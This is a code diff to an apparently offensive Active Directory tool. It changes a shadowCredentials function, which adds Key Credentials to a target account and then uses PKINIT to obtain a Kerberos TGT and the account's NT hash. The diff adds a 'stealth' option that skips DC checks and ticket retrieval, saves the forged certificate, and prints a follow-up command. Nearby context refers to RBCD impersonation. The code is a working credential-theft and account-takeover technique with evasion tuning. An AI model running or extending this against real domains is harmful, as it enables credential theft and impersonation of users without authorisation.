@@ -480,30 +480,33 @@ async def rbcd(conn: ConnectionHandler, target: str, service: str):
     LOG.info(f"{service} can now impersonate users on {target} via S4U2Proxy")
 
 
-async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "CurrentPath"):
+async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "CurrentPath", stealth: bool = False):
     """
     Add Key Credentials to target (try to find a suitable DC if provided DC is below Win2016), and use those credentials to retrieve a TGT and a NT hash using PKINIT.
 
     :param target: sAMAccountName, DN or SID of the target
     :param path: filepath for the generated credentials (TGT ccache or pfx if PKINIT fails)
+    :param stealth: disable check of compatible DC, pkinit and nthash unpac
     """
 
     # We scope on the domain of the target
     ldap = await conn.getLdap()
-    compatible_dcs = await utils.findCompatibleDC(conn, min_version=7, scope="DOMAIN")
 
-    if ldap._serverinfo["dnsHostName"] not in compatible_dcs:
-        if not compatible_dcs:
-            LOG.error("No DC with Windows Server 2016 or higher found on this domain, operation aborted")
-            return
-        LOG.warning(
-            "This DC does not seem to support KeyCredentialLink"
-        )
+    if not stealth:
+        compatible_dcs = await utils.findCompatibleDC(conn, min_version=7, scope="DOMAIN")
 
-        LOG.info(f"Attempting alternative DCs with KeyCredentialLink support: {compatible_dcs}")
-        new_conn = await utils.connectReachable(conn, compatible_dcs, ports=[389,636])
-        if not new_conn:
-            return
+        if ldap._serverinfo["dnsHostName"] not in compatible_dcs:
+            if not compatible_dcs:
+                LOG.error("No DC with Windows Server 2016 or higher found on this domain, operation aborted")
+                return
+            LOG.warning(
+                "This DC does not seem to support KeyCredentialLink"
+            )
+
+            LOG.info(f"Attempting alternative DCs with KeyCredentialLink support: {compatible_dcs}")
+            new_conn = await utils.connectReachable(conn, compatible_dcs, ports=[389,636])
+            if not new_conn:
+                return
 
     target_dn = None
     target_sAMAccountName = None
@@ -558,31 +561,36 @@ async def shadowCredentials(conn: ConnectionHandler, target: str, path: str = "C
         cas=None,
         encryption_algorithm=serialization.NoEncryption(),
     )
-    pfx_base64 = parse.quote(base64.b64encode(pfx).decode('utf-8'), safe="")
-
-    client = None
-    try:
-        url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}&timeout=350"
-        cu = factory.KerberosClientFactory.from_url(url)
-        client = cu.get_client_blocking()
-        tgs, enctgs, key, decticket = client.with_clock_skew(client.U2U)
-    except Exception as e:
+    if stealth:
         pfx_path = path + ".pfx"
         with open(pfx_path, "wb") as f:
             f.write(pfx)
-        LOG.error(f"PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
-        LOG.error(f"Retry on a working KDC and do:\nbadNTPKInit 'kerberos+pfx://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_path}&timeout=350'")
         LOG.info(f"PKINIT PFX certificate saved at: %s" % pfx_path)
-        raise e
-    finally:
-        if client and client.kerberos_TGT:
-            ccache_path = path + ".ccache"
-            client.ccache.to_file(path + ".ccache")
-            LOG.info('TGT stored in ccache file %s' % ccache_path)
-        # For the newconn opened if we had to use an alternative DC
-        await ldap.close()
-    
-    return [{cred[0]:cred[1]} for cred in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decticket)]
+        LOG.info(f"You can now obtain a TGT by doing badNTPKInit 'kerberos+pfx://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_path}'")
+    else:
+        pfx_base64 = parse.quote(base64.b64encode(pfx).decode('utf-8'), safe="")
+        client = None
+        try:
+            url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}&timeout=350"
+            cu = factory.KerberosClientFactory.from_url(url)
+            client = cu.get_client_blocking()
+            tgs, enctgs, key, decticket = client.with_clock_skew(client.U2U)
+        except Exception as e:
+            pfx_path = path + ".pfx"
+            with open(pfx_path, "wb") as f:
+                f.write(pfx)
+            LOG.error(f"PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
+            LOG.error(f"Retry on a working KDC and do:\nbadNTPKInit 'kerberos+pfx://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_path}&timeout=350'")
+            LOG.info(f"PKINIT PFX certificate saved at: %s" % pfx_path)
+            raise e
+        finally:
+            if client and client.kerberos_TGT:
+                ccache_path = path + ".ccache"
+                client.ccache.to_file(path + ".ccache")
+                LOG.info('TGT stored in ccache file %s' % ccache_path)
+            # For the newconn opened if we had to use an alternative DC
+            await ldap.close() 
+        return [{cred[0]:cred[1]} for cred in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decticket)]
 
             
 
